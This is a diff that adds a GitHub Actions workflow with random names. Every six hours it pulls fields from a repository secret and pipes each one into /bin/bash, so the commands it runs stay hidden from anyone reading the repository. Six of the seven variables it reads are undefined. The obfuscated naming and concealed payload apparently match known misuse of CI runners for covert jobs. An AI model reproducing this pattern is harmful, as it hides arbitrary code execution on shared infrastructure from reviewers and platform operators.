@@ -1,0 +1,25 @@
+name: yanfusu1932
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanfusu1932
+        env:
+          g62808: ${{ secrets.g62808 }}
+        run: |
+          echo $g62808 | jq -r .tcqpf342 | /bin/bash
+          echo $xpqm62 | jq -r .djuj341 | /bin/bash
+          echo $ehk500 | jq -r .yiwgw2 | /bin/bash
+          echo $fhg6679 | jq -r .gid6 | /bin/bash
+          echo $cxc22814 | jq -r .qx736 | /bin/bash
+          echo $h487 | jq -r .gh54699 | /bin/bash
+          echo $vw17623 | jq -r .lgkls7222 | /bin/bash
+
